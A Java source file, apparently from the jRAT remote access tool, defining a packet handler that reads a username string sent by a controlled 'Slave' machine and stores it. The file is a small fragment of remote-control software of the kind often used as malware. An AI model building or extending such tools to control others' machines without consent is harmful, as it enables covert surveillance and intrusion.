package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;


public class Packet22InitUsername extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String line = slave.readLine();
		slave.setUsername(line);
	}

}